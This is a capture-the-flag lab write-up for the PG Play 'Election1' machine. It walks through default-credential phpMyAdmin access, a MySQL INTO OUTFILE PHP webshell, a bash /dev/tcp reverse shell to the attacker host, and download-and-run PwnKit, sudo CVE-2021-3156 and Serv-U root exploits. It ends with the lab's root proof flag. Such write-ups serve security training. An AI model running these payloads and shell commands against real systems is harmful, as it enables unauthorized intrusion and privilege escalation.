---
render_with_liquid: false
title: PG Play  Election1
date: 2024-01-01 11:58:28 +1400
tags: [pg-play, nmap, linux, feroxbuster, enum, phpmyadmin, mysql, sqli2rce, file-write, webshell, php, pwnkit, oscp-like-2023, discover-secrets, cve-2021-3156]
---



# Learnt / Summary

- Stick to the basic, search for public exploits first if any banner/version info found
- When `phpmyadmin` is accessible, try all default creds
- Just try to insert/update user data from database when hash is not crackable

# Recon


## Nmap

```ruby

# Nmap 7.94SVN scan initiated Mon Jan  1 11:58:28 2024 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80 192.168.183.211
Nmap scan report for 192.168.183.211
Host is up, received user-set (0.28s latency).
Scanned at 2024-01-01 11:58:28 CST for 16s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 20:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCoqt4FP0lhkJ0tTiMEUrVqRIcNKgQK22LJCOIVa1yoZf+bgOqsR4mIDjgpaJm/SDrAzRhVlD1dL6apkv7T7iceuo5QDXYvRLWS+PfsEaGwGpEVtpTCl/BjDVVtohdzgErXS69pJhgo9a1yNgVrH/W2SUE1b36ODSNqVb690+aP6jjJdyh2wi8GBlNMXBy6V5hR/qmFC55u7F/z5oG1tZxeZpDHbgdM94KRO9dR0WfKDIBQGa026GGcXtN10wtui2UHo65/6WgIG1LxgjppvOQUBMzj1SHuYqnKQLZyQ18E8oxLZTjc6OC898TeYMtyyKW0viUzeaqFxXPDwdI6G91J
|   256 78:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBO9gF8Fv+Uox9ftsvK/DNkPNObtE4BiuaXjwksbOizwtXBepSbhUTyL5We/fWe7x62XW0CMFJWcuQsBNS7IyjsE=
|   256 b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINfCRDfwNshxW7uRiu76SMZx2hg865qS6TApHhvwKSH5
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Mon Jan  1 11:58:44 2024 -- 1 IP address (1 host up) scanned in 16.16 seconds
```


## 80 - Apache2 Ubuntu Default Page: It works

![](/assets/obsidian/37918a9156ff2b0c58767194cc2b3d49.png)

### Dir

```bash
┌──(bravosec㉿fsociety)-[~/pgplay/Election1]
└─$ feroxbuster -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 100 -u 'http://192.168.183.211/' -o ferox_80.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.183.211/
 🚀  Threads               │ 100
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox_80.txt
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       15l       74w     6147c http://192.168.183.211/icons/ubuntu-logo.png
200      GET      375l      964w    10918c http://192.168.183.211/
200      GET      375l      964w    10918c http://192.168.183.211/index.html
301      GET        9l       28w      323c http://192.168.183.211/javascript => http://192.168.183.211/javascript/
301      GET        9l       28w      323c http://192.168.183.211/phpmyadmin => http://192.168.183.211/phpmyadmin/
200      GET     1170l     5860w    95442c http://192.168.183.211/phpinfo.php
200      GET        4l        4w       30c http://192.168.183.211/robots.txt
301      GET        9l       28w      330c http://192.168.183.211/javascript/jquery => http://192.168.183.211/javascript/jquery/
301      GET        9l       28w      327c http://192.168.183.211/phpmyadmin/doc => http://192.168.183.211/phpmyadmin/doc/
200      GET       98l      278w    35231c http://192.168.183.211/phpmyadmin/favicon.ico
200      GET      325l      922w     7771c http://192.168.183.211/phpmyadmin/js/codemirror/lib/codemirror.css
200      GET       77l      147w     3068c http://192.168.183.211/phpmyadmin/js/codemirror/addon/lint/lint.css
200      GET        1l        1w       53c http://192.168.183.211/phpmyadmin/themes/dot.gif
200      GET       38l       73w      662c http://192.168.183.211/phpmyadmin/js/codemirror/addon/hint/show-hint.css
200      GET      267l      586w     6763c http://192.168.183.211/phpmyadmin/js/get_image.js.php
200      GET        0l        0w        0c http://192.168.183.211/phpmyadmin/js/get_scripts.js.php
200      GET      212l      807w    13316c http://192.168.183.211/phpmyadmin/doc/html/index.html
200      GET     1225l     3355w    35020c http://192.168.183.211/phpmyadmin/themes/pmahomme/jquery/jquery-ui-1.11.4.css
200      GET      394l     2973w    29261c http://192.168.183.211/phpmyadmin/js/messages.php
301      GET        9l       28w      330c http://192.168.183.211/phpmyadmin/locale => http://192.168.183.211/phpmyadmin/locale/
301      GET        9l       28w      326c http://192.168.183.211/phpmyadmin/js => http://192.168.183.211/phpmyadmin/js/
200      GET      170l      365w     2611c http://192.168.183.211/phpmyadmin/themes/pmahomme/css/printview.css
200      GET       26l      359w    10531c http://192.168.183.211/phpmyadmin/index.php
200      GET       19l      102w     8154c http://192.168.183.211/phpmyadmin/themes/pmahomme/img/logo_right.png
302      GET        0l        0w        0c http://192.168.183.211/phpmyadmin/url.php => http://192.168.183.211/phpmyadmin/
200      GET       26l      359w    10538c http://192.168.183.211/phpmyadmin/db_structure.php
401      GET       14l       54w      462c http://192.168.183.211/phpmyadmin/setup
301      GET        9l       28w      330c http://192.168.183.211/phpmyadmin/themes => http://192.168.183.211/phpmyadmin/themes/
301      GET        9l       28w      327c http://192.168.183.211/phpmyadmin/sql => http://192.168.183.211/phpmyadmin/sql/
301      GET        9l       28w      333c http://192.168.183.211/phpmyadmin/js/jquery => http://192.168.183.211/phpmyadmin/js/jquery/
301      GET        9l       28w      333c http://192.168.183.211/phpmyadmin/locale/az => http://192.168.183.211/phpmyadmin/locale/az/
200      GET    10253l    40948w   268026c http://192.168.183.211/javascript/jquery/jquery
301      GET        9l       28w      333c http://192.168.183.211/phpmyadmin/locale/bg => http://192.168.183.211/phpmyadmin/locale/bg/
301      GET        9l       28w      333c http://192.168.183.211/phpmyadmin/locale/cs => http://192.168.183.211/phpmyadmin/locale/cs/
301      GET        9l       28w      333c http://192.168.183.211/phpmyadmin/locale/de => http://192.168.183.211/phpmyadmin/locale/de/
301      GET        9l       28w      333c http://192.168.183.211/phpmyadmin/locale/fr => http://192.168.183.211/phpmyadmin/locale/fr/
301      GET        9l       28w      333c http://192.168.183.211/phpmyadmin/locale/gl => http://192.168.183.211/phpmyadmin/locale/gl/
301      GET        9l       28w      333c http://192.168.183.211/phpmyadmin/locale/el => http://192.168.183.211/phpmyadmin/locale/el/
301      GET        9l       28w      333c http://192.168.183.211/phpmyadmin/locale/hu => http://192.168.183.211/phpmyadmin/locale/hu/
301      GET        9l       28w      333c http://192.168.183.211/phpmyadmin/locale/ia => http://192.168.183.211/phpmyadmin/locale/ia/
301      GET        9l       28w      342c http://192.168.183.211/phpmyadmin/js/transformations => http://192.168.183.211/phpmyadmin/js/transformations/
301      GET        9l       28w      333c http://192.168.183.211/phpmyadmin/locale/ja => http://192.168.183.211/phpmyadmin/locale/ja/
301      GET        9l       28w      339c http://192.168.183.211/phpmyadmin/themes/original => http://192.168.183.211/phpmyadmin/themes/original/
301      GET        9l       28w      333c http://192.168.183.211/phpmyadmin/locale/id => http://192.168.183.211/phpmyadmin/locale/id/
301      GET        9l       28w      333c http://192.168.183.211/phpmyadmin/locale/it => http://192.168.183.211/phpmyadmin/locale/it/
301      GET        9l       28w      333c http://192.168.183.211/phpmyadmin/locale/ko => http://192.168.183.211/phpmyadmin/locale/ko/
301      GET        9l       28w      333c http://192.168.183.211/phpmyadmin/locale/nl => http://192.168.183.211/phpmyadmin/locale/nl/
301      GET        9l       28w      333c http://192.168.183.211/phpmyadmin/locale/sk => http://192.168.183.211/phpmyadmin/locale/sk/
301      GET        9l       28w      333c http://192.168.183.211/phpmyadmin/locale/sl => http://192.168.183.211/phpmyadmin/locale/sl/
```

### Enum

Check `robots.txt`

![](/assets/obsidian/85a8c043a18f855fd286be130f45b6e7.png)

Only `election` didn't return 404

![](/assets/obsidian/4734d0060484e47b0644019d6a7873da.png)

# Initial Access


## Shell as www-data


### phpMyAdmin - Mysql weak password

> http://192.168.183.211/phpmyadmin/ 

- `root:root`
- `root:`
- `root:password`
- `root:toor` - Success

> **Bruteforce default credentials**
> ```bash
> ffuf -c -request-proto http -request login.req -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt:FUZZ1 -w /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt:FUZZ2 -fs 2901
> ```
{: .prompt-info }

![](/assets/obsidian/e9a803e29bb4bbc7bc651f993ab0d7c5.png)


### Mysql to RCE via writing PHP webshell

`root` can write files

The web root directory `/var/www/html/` was revealed in `http://192.168.183.211/phpinfo.php` and **Apache2 Default Page** 

![](/assets/obsidian/ce1e0c0d54d83298c75989300fc038d9.png)

![](/assets/obsidian/dfcf9862c21062cd25023c230db13b42.png)

Insert a webshell in webroot

```sql
SELECT "<?php system($_REQUEST[0]); ?>" INTO OUTFILE '/var/www/html/c.php' FIELDS TERMINATED BY '' OPTIONALLY ENCLOSED BY '' LINES TERMINATED BY '\n'
```

^dbe2ec

![](/assets/obsidian/bee69744127c866d7bb628d5a58ac148.png)

```bash
┌──(bravosec㉿fsociety)-[~/pgplay/Election1]
└─$ curl http://192.168.183.211/c.php --data-urlencode '0=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Get a shell

```bash
┌──(bravosec㉿fsociety)-[~/pgplay/Election1]
└─$ curl http://192.168.183.211/c.php --data-urlencode '0=bash -c "bash -i >& /dev/tcp/192.168.45.190/443 0>&1"'
```

```bash
┌──(bravosec㉿fsociety)-[~/pgplay/Election1]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.45.190] from (UNKNOWN) [192.168.183.211] 36992
bash: cannot set terminal process group (872): Inappropriate ioctl for device
bash: no job control in this shell
www-data@election:/var/www/html$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<ml$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@election:/var/www/html$ ^Z
zsh: suspended  nc -lvnp 443

┌──(bravosec㉿fsociety)-[~/pgplay/Election1]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 443

www-data@election:/var/www/html$ export TERM=xterm
www-data@election:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# Privilege Escalation


## From www-data to root

### Pwnkit

`pkexec` have SUID bits set, indicates that machine might be vulnerable to **pwnkit**

```bash
www-data@election:/var/www/html$ find / -type f -perm -4000 -ls 2>/dev/null
      199     24 -rwsr-xr-x   1 root     root        22528 Jun 28  2019 /usr/bin/arping
      950     60 -rwsr-xr-x   1 root     root        59640 Mar 23  2019 /usr/bin/passwd
     1056     24 -rwsr-xr-x   1 root     root        22520 Mar 27  2019 /usr/bin/pkexec
     1443     20 -rwsr-xr-x   1 root     root        18448 Jun 28  2019 /usr/bin/traceroute6.iputils
      892     40 -rwsr-xr-x   1 root     root        40344 Mar 23  2019 /usr/bin/newgrp
      275     44 -rwsr-xr-x   1 root     root        44528 Mar 23  2019 /usr/bin/chsh
      273     76 -rwsr-xr-x   1 root     root        76496 Mar 23  2019 /usr/bin/chfn
      530     76 -rwsr-xr-x   1 root     root        75824 Mar 23  2019 /usr/bin/gpasswd
     5281    148 -rwsr-xr-x   1 root     root       149080 Jan 31  2020 /usr/bin/sudo
     3127    376 -rwsr-xr--   1 root     dip        382696 Feb 11  2020 /usr/sbin/pppd
   396554   6172 -rwsr-xr-x   1 root     root      6319088 Nov 29  2017 /usr/local/Serv-U/Serv-U
     6947     16 -rwsr-xr-x   1 root     root        14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
     2605     12 -rwsr-xr-x   1 root     root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
     6907    428 -rwsr-xr-x   1 root     root       436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
     2304     44 -rwsr-xr--   1 root     messagebus    42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
      277     12 -rwsr-sr-x   1 root     root          10232 Dec 18  2019 /usr/lib/xorg/Xorg.wrap
   262203     32 -rwsr-xr-x   1 root     root          30800 Aug 11  2016 /bin/fusermount
   262276     64 -rwsr-xr-x   1 root     root          64424 Jun 28  2019 /bin/ping
   262201     28 -rwsr-xr-x   1 root     root          26696 Mar  5  2020 /bin/umount
   262188     44 -rwsr-xr-x   1 root     root          43088 Mar  5  2020 /bin/mount
   262304     44 -rwsr-xr-x   1 root     root          44664 Mar 23  2019 /bin/su
[...]
```

```bash
python3 /dev/shm/p/var/www/html$ wget 192.168.45.190/PwnKit.py -O /dev/shm/p && python3 /dev/shm/p
--2024-01-01 10:15:57--  http://192.168.45.190/PwnKit.py
Connecting to 192.168.45.190:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3262 (3.2K) [text/x-python]
Saving to: '/dev/shm/p'

/dev/shm/p          100%[===================>]   3.19K  --.-KB/s    in 0.001s

2024-01-01 10:15:57 (2.43 MB/s) - '/dev/shm/p' saved [3262/3262]

[+] Creating shared library for exploit code.
[+] Calling execve()

# id
uid=0(root) gid=33(www-data) groups=33(www-data)
```

# Post Exploitation


## System Proof Screenshot

![](/assets/obsidian/163f85cc146b0385b26357d1d3729fb1.png)


## User love's password in system logs

```bash
www-data@election:/var/www/html$ find . -type f -exec ls -latr {} +
```

```bash
[...]
-rwxrwxrwx 1 www-data www-data     83 Apr  3  2020  ./election/.htaccess
[...]
-rw-r--r-- 1 www-data www-data    284 Jan  1 09:54  ./election/admin/logs/system.log
www-data@election:/var/www/html$
```

```bash
www-data@election:/var/www/html$ cat ./election/.htaccess
Options -Indexes
RewriteEngine on
RewriteRule ^admin/logs/system.log admin/logs.php
```

```bash
www-data@election:/var/www/html$ cat ./election/admin/logs/system.log
[2020-01-01 00:00:00] Assigned Password for the user love: P@$$w0rd@123
[2020-04-03 00:13:53] Love added candidate 'Love'.
[2020-04-08 19:26:34] Love has been logged in from Unknown IP on Firefox (Linux).
[2024-01-01 09:54:30] x has been logged in from Unknown IP on Firefox (Linux).
```

```bash
┌──(bravosec㉿fsociety)-[~/pgplay/Election1]
└─$ cssh love@$(pt get rhost) 'P@$$w0rd@123'
Warning: Permanently added 'att.pg' (ED25519) to the list of known hosts.
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 5.4.0-120-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

471 packages can be updated.
358 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Your Hardware Enablement Stack (HWE) is supported until April 2023.
Last login: Thu Apr  9 23:19:28 2020 from 192.168.1.5
love@election:~$ id
uid=1000(love) gid=1000(love) groups=1000(love),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare)
```

## admin credential for eLection

```bash
www-data@election:/var/www/html$ find . -type f -exec ls -latr {} +
```

```bash
[...]
-rw-r--r-- 1 www-data www-data   8553 Apr  3  2020  ./election/admin/ajax/op_updater.php
-rw-r--r-- 1 www-data www-data   7775 Apr  3  2020  ./election/admin/ajax/op_pengaturan.php
-rw-r--r-- 1 www-data www-data    280 Apr  3  2020  ./election/admin/inc/conn.php
-rw-r--r-- 1 love     love       1935 Apr  9  2020  ./election/card.php
-rw-r--r-- 1 www-data www-data    284 Jan  1 09:54  ./election/admin/logs/system.log
www-data@election:/var/www/html$
```

```bash
www-data@election:/var/www/html$ cat ./election/card.php
00110000 00110001 00110001 00110001 00110000 00110001 00110000 00110001 00100000 00110000 00110001 00110001 00110001 00110000 00110000 00110001 00110001 00100000 00110000 00110001 00110001 00110000 00110000 00110001 00110000 00110001 00100000 00110000 00110001 00110001 00110001 00110000 00110000 00110001 00110000 00100000 00110000 00110000 00110001 00110001 00110001 00110000 00110001 00110000 00100000 00110000 00110000 00110001 00110001 00110000 00110000 00110000 00110001 00100000 00110000 00110000 00110001 00110001 00110000 00110000 00110001 00110000 00100000 00110000 00110000 00110001 00110001 00110000 00110000 00110001 00110001 00100000 00110000 00110000 00110001 00110001 00110000 00110001 00110000 00110000 00100000 00110000 00110000 00110000 00110000 00110001 00110000 00110001 00110000 00100000 00110000 00110001 00110001 00110001 00110000 00110000 00110000 00110000 00100000 00110000 00110001 00110001 00110000 00110000 00110000 00110000 00110001 00100000 00110000 00110001 00110001 00110001 00110000 00110000 00110001 00110001 00100000 00110000 00110001 00110001 00110001 00110000 00110000 00110001 00110001 00100000 00110000 00110000 00110001 00110001 00110001 00110000 00110001 00110000 00100000 00110000 00110001 00110000 00110001 00110001 00110000 00110001 00110000 00100000 00110000 00110001 00110001 00110001 00110001 00110000 00110000 00110000 00100000 00110000 00110001 00110001 00110000 00110000 00110000 00110001 00110001 00100000 00110000 00110000 00110001 00110001 00110000 00110000 00110000 00110001 00100000 00110000 00110000 00110001 00110001 00110000 00110000 00110001 00110000 00100000 00110000 00110000 00110001 00110001 00110000 00110000 00110001 00110001 00100000 00110000 00110000 00110001 00110000 00110000 00110000 00110000 00110001 00100000 00110000 00110001 00110000 00110000 00110000 00110000 00110000 00110000 00100000 00110000 00110000 00110001 00110000 00110000 00110000 00110001 00110001
```

Decoded :

```
user:1234
pass:Zxc123!@#
```

![](/assets/obsidian/487c3863ebf4ce31633d458b2cc415f2.png)

# Appendix

## Sudo version 1.8.21p2 (CVE-2021-3156)

> https://github.com/CptGibbon/CVE-2021-3156.git

```bash
love@election:/tmp/CVE-2021-3156$ sudo -V
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
```

```bash
love@election:~$ curl http://192.168.45.190:81/cve.zip -o /tmp/cve.zip
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 29610  100 29610    0     0  35804      0 --:--:-- --:--:-- --:--:-- 35804
love@election:~$ cd /tmp
love@election:/tmp$ unzip cve.zip
[...]
love@election:/tmp$ cd CVE-2021-3156/
love@election:/tmp/CVE-2021-3156$ make
mkdir libnss_x
cc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c
cc -O3 -o exploit exploit.c
love@election:/tmp/CVE-2021-3156$ ./exploit

# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare),1000(love)
```


## Serv-U 15.1.6 Privilege Escalation (CVE-2019-12181)

```bash
   396554   6172 -rwsr-xr-x   1 root     root      6319088 Nov 29  2017 /usr/local/Serv-U/Serv-U
```

Google : `Serv-U exploit`

> https://www.exploit-db.com/exploits/47009

```bash
love@election:/tmp$ vi ok.c
love@election:/tmp$ gcc ok.c -o ok
love@election:/tmp$ chmod +x ok
love@election:/tmp$ ./ok
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare),1000(love)
opening root shell

# cat /root/proof.txt
00375527b9902759ecd191ac66fd5706
```

## Feroxbuster - Cancel jobs

Press `ENTER` to enter the menu, it can stop brute forcing unwanted directories

![](/assets/obsidian/2ea77361492a2a8b0cc182f2a8f873d9.png)

